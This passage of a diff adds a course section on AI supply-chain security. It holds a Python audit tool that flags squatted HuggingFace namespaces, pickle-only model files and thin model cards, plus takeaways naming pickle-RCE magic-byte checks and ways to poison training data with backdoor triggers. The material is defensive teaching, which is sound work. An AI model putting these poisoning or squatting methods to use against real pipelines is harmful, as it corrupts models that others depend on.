+        if 0 &lt; dist &lt;= SQUATTING_SIMILARITY_THRESHOLD:
+            squats.append(f&quot;&#x27;{org}&#x27; is edit-distance {dist} from &#x27;{canonical}&#x27;&quot;)
+    if squats:
+        warnings.extend(squats)
+        return (&quot;critical&quot;, &quot;POSSIBLE NAMESPACE SQUATTING DETECTED&quot;, warnings)
+
+    if is_trusted:
+        return (&quot;low&quot;, f&quot;Organisation &#x27;{org}&#x27; matches trusted org pattern&quot;, warnings)
+    return (&quot;medium&quot;, f&quot;Unverified organisation: &#x27;{org}&#x27; — manual verification required&quot;, warnings)
+
+
+# -----------------------------------------------------------------------
+# Step 2 — File Format Check (simplified for API demo)
+# -----------------------------------------------------------------------
+
+def check_file_format_from_filelist(files: List[str]) -&gt; Tuple[str, str]:
+    &quot;&quot;&quot;
+    Check file extensions in the model&#x27;s file list.
+    Returns: (risk_level, detail)
+    &quot;&quot;&quot;
+    has_safetensors = any(f.endswith(&#x27;.safetensors&#x27;) for f in files)
+    has_pickle = any(f.endswith((&#x27;.bin&#x27;, &#x27;.pkl&#x27;, &#x27;.pt&#x27;, &#x27;.pth&#x27;)) for f in files)
+    has_onnx = any(f.endswith(&#x27;.onnx&#x27;) for f in files)
+
+    if has_pickle and not has_safetensors:
+        return (&quot;critical&quot;,
+                &quot;Only pickle-format files (.bin/.pkl/.pt/.pth) present — RCE risk on load&quot;)
+    if has_pickle and has_safetensors:
+        return (&quot;medium&quot;,
+                &quot;Both SafeTensors and pickle files present — use SafeTensors exclusively&quot;)
+    if has_safetensors:
+        return (&quot;low&quot;, &quot;SafeTensors format confirmed in file list&quot;)
+    if has_onnx:
+        return (&quot;low&quot;, &quot;ONNX format present — safe for loading&quot;)
+    return (&quot;high&quot;, &quot;No recognised model file formats found — manual verification required&quot;)
+
+
+# -----------------------------------------------------------------------
+# Step 3 — Model Card Score
+# -----------------------------------------------------------------------
+
+MODEL_CARD_FIELDS = {
+    &quot;has_model_description&quot;: 10,
+    &quot;has_training_data_info&quot;: 20,
+    &quot;has_evaluation_results&quot;: 20,
+    &quot;has_intended_use&quot;: 15,
+    &quot;has_limitations&quot;: 15,
+    &quot;has_licence&quot;: 10,
+    &quot;has_citation&quot;: 5,
+    &quot;has_contact_info&quot;: 5,
+}
+
+
+def score_model_card(presence: Dict[str, bool]) -&gt; Tuple[int, str, List[str]]:
+    score = sum(w for f, w in MODEL_CARD_FIELDS.items() if presence.get(f, False))
+    missing = [f for f in MODEL_CARD_FIELDS if not presence.get(f, False)]
+    risk = &quot;low&quot; if score &gt;= 80 else &quot;medium&quot; if score &gt;= 60 else &quot;high&quot;
+    return (score, risk, missing)
+
+
+# -----------------------------------------------------------------------
+# Audit Report
+# -----------------------------------------------------------------------
+
+@dataclass
+class HFModelAuditReport:
+    model_id: str
+    namespace_risk: str
+    namespace_detail: str
+    namespace_warnings: List[str]
+    format_risk: str
+    format_detail: str
+    card_score: int
+    card_risk: str
+    card_missing: List[str]
+    overall_risk: str = field(init=False)
+    recommendation: str = field(init=False)
+
+    def __post_init__(self):
+        risks = [self.namespace_risk, self.format_risk, self.card_risk]
+        if &quot;critical&quot; in risks:
+            self.overall_risk = &quot;critical&quot;
+            self.recommendation = &quot;REJECT — do not use this model&quot;
+        elif risks.count(&quot;high&quot;) &gt;= 2:
+            self.overall_risk = &quot;high&quot;
+            self.recommendation = &quot;REJECT — too many high-risk findings&quot;
+        elif &quot;high&quot; in risks:
+            self.overall_risk = &quot;high&quot;
+            self.recommendation = &quot;MANUAL REVIEW — security team approval required&quot;
+        elif &quot;medium&quot; in risks:
+            self.overall_risk = &quot;medium&quot;
+            self.recommendation = &quot;MANUAL REVIEW — document risks before use&quot;
+        else:
+            self.overall_risk = &quot;low&quot;
+            self.recommendation = &quot;PROCEED — complete sandbox test and hash pin before production&quot;
+
+
+def audit_hf_model(
+    model_id: str,
+    file_list: List[str],
+    model_card_presence: Dict[str, bool],
+) -&gt; HFModelAuditReport:
+    ns_risk, ns_detail, ns_warn = check_namespace(model_id)
+    fmt_risk, fmt_detail = check_file_format_from_filelist(file_list)
+    card_score, card_risk, card_missing = score_model_card(model_card_presence)
+    return HFModelAuditReport(
+        model_id=model_id,
+        namespace_risk=ns_risk, namespace_detail=ns_detail,
+        namespace_warnings=ns_warn,
+        format_risk=fmt_risk, format_detail=fmt_detail,
+        card_score=card_score, card_risk=card_risk, card_missing=card_missing,
+    )
+
+
+def print_audit_report(r: HFModelAuditReport) -&gt; None:
+    print(f&quot;\n{&#x27;=&#x27;*60}&quot;)
+    print(f&quot;HF MODEL AUDIT: {r.model_id}&quot;)
+    print(f&quot;Overall:  [{r.overall_risk.upper()}]&quot;)
+    print(f&quot;Action:   {r.recommendation}&quot;)
+    print(f&quot;\nCheck Results:&quot;)
+    print(f&quot;  [{r.namespace_risk.upper():8s}] Namespace: {r.namespace_detail[:55]}&quot;)
+    for w in r.namespace_warnings:
+        print(f&quot;             WARNING: {w}&quot;)
+    print(f&quot;  [{r.format_risk.upper():8s}] Format:    {r.format_detail[:55]}&quot;)
+    card_icon = r.card_risk.upper()
+    print(f&quot;  [{card_icon:8s}] Model Card: {r.card_score}/100&quot;
+          + (f&quot; — Missing: {&#x27;, &#x27;.join(r.card_missing[:2])}&quot; if r.card_missing else &quot;&quot;))
+
+
+if __name__ == &quot;__main__&quot;:
+    # Test 1: Legitimate Llama model
+    r1 = audit_hf_model(
+        model_id=&quot;meta-llama/Meta-Llama-3-8B&quot;,
+        file_list=[&quot;config.json&quot;, &quot;model.safetensors&quot;, &quot;tokenizer.json&quot;],
+        model_card_presence={
+            &quot;has_model_description&quot;: True, &quot;has_training_data_info&quot;: True,
+            &quot;has_evaluation_results&quot;: True, &quot;has_intended_use&quot;: True,
+            &quot;has_limitations&quot;: True, &quot;has_licence&quot;: True,
+            &quot;has_citation&quot;: True, &quot;has_contact_info&quot;: False,
+        },
+    )
+    print_audit_report(r1)
+
+    # Test 2: Squatted namespace
+    r2 = audit_hf_model(
+        model_id=&quot;meta1lama/Meta-Llama-3-8B&quot;,
+        file_list=[&quot;model.bin&quot;],
+        model_card_presence={&quot;has_model_description&quot;: True},
+    )
+    print_audit_report(r2)
+
+    # Test 3: Unknown org, pickle only, incomplete card
+    r3 = audit_hf_model(
+        model_id=&quot;random-user-2024/finance-gpt&quot;,
+        file_list=[&quot;pytorch_model.bin&quot;],
+        model_card_presence={&quot;has_model_description&quot;: True, &quot;has_licence&quot;: False},
+    )
+    print_audit_report(r3)</code></pre>
+<h2 class="sh1">Deliverables</h2>
+<h3 class="sh2">Deliverable 01</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">Model Artifact Scanner</p>
+<h3 class="sh3">Files</h3>
+<ul class="blist"><li>ml_artifact_scanner.py — scan_artifact() + print_scan_report()</li></ul>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">Scanner run against at least three real or mock model files.
+At least one pickle-format file correctly detected and blocked.
+SafeTensors format correctly passes all six checks.
+Scan report generated and reviewed for all production-candidate models.</p>
+<h3 class="sh2">Deliverable 02</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">Supply Chain Security Checklist</p>
+<h3 class="sh3">Files</h3>
+<ul class="blist"><li>ml_sbom_generator.py — CHECKLIST_STAGES + run_checklist()</li></ul>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">All eight stages reviewed against your current practice.
+Per-stage scores computed and documented.
+At least three failing items per stage remediated or scheduled.
+Overall checklist score &gt;= 60% before any new model enters production.</p>
+<h3 class="sh2">Deliverable 03</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">HuggingFace Model Audit Procedure</p>
+<h3 class="sh3">Files</h3>
+<ul class="blist"><li>hf_model_audit.py — audit_hf_model() + print_audit_report()</li></ul>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">Audit run against at least five real public models from HuggingFace.
+At least one model flagged for namespace risk or format risk.
+Audit procedure documented as standard operating procedure for all
+external model downloads in your organisation.</p>
+<h3 class="sh2">Deliverable 04</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">ML SBOM Template</p>
+<h3 class="sh3">Files</h3>
+<ul class="blist"><li>ml_sbom_generator.py — MLSBOM + export_yaml()</li></ul>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">SBOM generated for at least one model in your deployment or reference
+architecture. All four layers populated with real or representative data.
+SBOM exported as YAML and stored alongside model registry entry.</p>
+<h3 class="sh2">Deliverable 05</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">LoRA Adapter Integrity Verification Procedure</p>
+<h3 class="sh3">Content</h3>
+<p class="prose">Documented procedure covering all six adapter verification steps:
+hash at download, hash re-verify at serve, regression test on
+base+adapter combination, hash monitoring in registry, composition
+stack enumeration, adapter provenance record.</p>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">Procedure documented. If LoRA adapters are in use or planned: procedure
+implemented for all adapters. If not yet in use: procedure ready for
+future adoption with implementation hooks identified.</p>
+<h3 class="sh2">Deliverable 06</h3>
+<h3 class="sh3">Title</h3>
+<p class="prose">Documented Supply Chain Incident Case Studies</p>
+<h3 class="sh3">Content</h3>
+<p class="prose">Analysis of three documented AI supply chain incidents (Protect AI
+HuggingFace pickle exploits 2023, HuggingFace Spaces compromise 2024,
+JFrog obfuscated pickle research 2023) mapped to ATLAS techniques,
+with lessons applied to your deployment.</p>
+<h3 class="sh3">Completion Criteria</h3>
+<p class="prose">All three incidents reviewed. ATLAS technique mapping documented for each.
+At least one control improvement per incident implemented in your
+verification pipeline or checklist.</p>
+<h2 class="sh1">Key Takeaways</h2>
+<h3 class="sh2">Takeaway 01</h3>
+<p class="prose">ML models are executables. Loading a PyTorch .bin file with torch.load()
+is equivalent to running an untrusted binary. This is not a metaphor —
+pickle&#x27;s __reduce__ protocol enables arbitrary shell command execution
+on model load. SafeTensors eliminates this by restricting the format to
+tensor data only, making code execution structurally impossible.</p>
+<h3 class="sh2">Takeaway 02</h3>
+<p class="prose">The AI supply chain has six distinct layers each with independent attack
+surfaces: dataset acquisition, preprocessing, base model download, fine-tuning
+and adapters, framework dependencies, and model registry/serving. A control
+at one layer does not compensate for a gap at another. Defence-in-depth
+across all six is required.</p>
+<h3 class="sh2">Takeaway 03</h3>
+<p class="prose">Public datasets (Common Crawl, GitHub, Wikipedia) are adversary-writable.
+SEO poisoning of Common Crawl, trojan PRs to GitHub repositories, and
+Wikipedia vandalism during snapshot windows are all documented or technically
+feasible mechanisms for training data contamination without any access to
+victim infrastructure.</p>
+<h3 class="sh2">Takeaway 04</h3>
+<p class="prose">LoRA adapters are a unique supply chain risk: cheap to produce, often
+downloaded and verified separately from the base model, and in dynamic
+serving architectures can be swapped at runtime without a deployment event.
+Every adapter in every composition stack must be independently hashed,
+registered, and monitored.</p>
+<h3 class="sh2">Takeaway 05</h3>
+<p class="prose">The ML SBOM captures what traditional software SBOMs miss: training datasets,
+base model identity and format, adapter provenance, and fine-tuning lineage.
+Without an ML SBOM, an organisation cannot answer the question &quot;which of our
+production models is affected by this CVE?&quot; or &quot;did this model&#x27;s training data
+include data from source X that we now know is compromised?&quot;</p>
+<h3 class="sh2">Takeaway 06</h3>
+<p class="prose">Download count and HuggingFace star count are not security signals. Adversaries
+artificially inflate these metrics. The only reliable signals are: SafeTensors
+format (structural, not gameable), SHA-256 hash match against a known-good
+record, model card completeness (partial signal), and behavioural regression
+test on a trigger-probe suite.</p>
+<h3 class="sh2">Takeaway 07</h3>
+<p class="prose">Two format checks block the primary ML supply chain attack vector with zero
+false positives and zero tuning: (1) verify file_header[0:2] NOT in pickle
+magic bytes, (2) verify file_header[8:9] == &#x27;{&#x27; for SafeTensors. These two
+checks, implemented at model intake, eliminate pickle RCE from the supply
+chain without any impact on legitimate SafeTensors models.</p>
+<h3 class="sh2">Takeaway 08</h3>
+<p class="prose">The three documented incidents (Protect AI 2023, HuggingFace Spaces 2024,
+JFrog 2023) share a common root cause: implicit trust in a public model hub
+without structural format verification. Obfuscation (JFrog finding) defeats
+content-based scanning but not structural format validation — SafeTensors
+enforcement is the correct defence, not pattern matching on file contents.</p>
+<h2 class="sh1">Connections</h2>
+<h3 class="sh2">Builds On</h3>
+<h3 class="sh3">Section</h3>
+<p class="prose">5.5</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">OWASP LLM05 supply chain overview — Section 5.9 is the full architectural depth</p>
+<h3 class="sh3">Section</h3>
+<p class="prose">5.8</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">AML.T0019 and AML.T0011 detection specs — Section 5.9 is the architecture behind those detections</p>
+<h3 class="sh3">Chapter</h3>
+<p class="prose">1</p>
+<h3 class="sh3">Section</h3>
+<p class="prose">1.6 — Training Process</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">Training pipeline structure is the target of dataset poisoning and training-time supply chain attacks</p>
+<h3 class="sh2">Leads To</h3>
+<h3 class="sh3">Section</h3>
+<p class="prose">5.10</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">Training data extraction — Section 5.10 covers what happens when poisoned or memorised data is recovered from a deployed model</p>
+<h3 class="sh3">Chapter</h3>
+<p class="prose">11</p>
+<h3 class="sh3">Section</h3>
+<p class="prose">Detection Engineering</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">The artifact scanner and supply chain checklist generate detection rules for the Chapter 11 programme</p>
+<h3 class="sh3">Chapter</h3>
+<p class="prose">14</p>
+<h3 class="sh3">Section</h3>
+<p class="prose">Production Deployment Security</p>
+<h3 class="sh3">Reason</h3>
+<p class="prose">ML SBOM and artifact verification pipeline are production controls implemented in Chapter 14</p>
+<h2 class="sh1">Section Summary</h2>
+<h3 class="sh2">One Paragraph</h3>
+<p class="prose">Section 5.9 establishes AI supply chain security as a systemic discipline spanning
+six distinct attack-surface layers — dataset acquisition, preprocessing, base model
+download, fine-tuning and adapters, framework dependencies, and model registry and
+serving — and provides the technical depth and operational tooling to defend each one.
+The section opens with the npm analogy: the AI ecosystem exhibits the same implicit-
+trust-in-public-repositories dynamic that made npm vulnerable in 2016, with one
+critical additional risk — a malicious ML model is not merely broken software but
+a potential arbitrary code execution vehicle via pickle deserialisation. The pickle
+RCE mechanics are explained in full (the __reduce__ protocol, the two-byte magic
+byte detection signature) alongside SafeTensors architecture (tensor-only format,
+structural impossibility of code execution). Dataset poisoning at source is covered
+for Common Crawl (SEO poisoning, backdoor trigger injection at web scale), GitHub
+(trojan PRs, fork manipulation), and Wikipedia (vandalism window contamination).
+The HuggingFace ecosystem receives dedicated treatment: five documented supply chain
+risks (namespace squatting, account compromise, malicious weights, dataset poisoning,
+model card trust) and a six-step audit procedure. LoRA adapter swapping is examined
+as a unique post-deployment integrity risk — small, cheap to produce, independently
+downloaded, and in dynamic serving architectures swappable at runtime without a
+deployment event. Third-party ML library vulnerabilities cover the three documented
+CVE classes (model loading RCE, serving infrastructure RCE, training pipeline RCE)
+alongside SCA scanning requirements. The ML SBOM section defines the four-layer
+structure (dataset, base model, adapter, framework) with all required fields per
+layer and the incident response, audit, and traceability benefits it enables. The
+section closes with the six-check artifact verification pipeline (format, hash,
+model card, dependency scan, sandbox load, behavioural regression) and analysis of
+three documented 2023-2024 supply chain incidents (Protect AI, HuggingFace Spaces,
+JFrog) mapped to ATLAS techniques with lessons applied. Three implementations
+deliver the production artifact scanner, the ML SBOM generator with supply chain
+checklist, and the HuggingFace model audit tool.</p>
+<h3 class="sh2">Next Section</h3>
+<p class="prose">Section 5.10 — Privacy Attacks: Training Data Extraction
+The supply chain complete, Section 5.10 examines what adversaries do with
+deployed models: extract the training data embedded in weights. Memorisation
+taxonomy (verbatim, approximate, concept-level), Carlini et al. methodology,
+differential privacy as a formal defence, and detection of extraction attempts
+from API logs — closing the loop from supply chain integrity to output-side
+privacy monitoring.</p>
+</article>
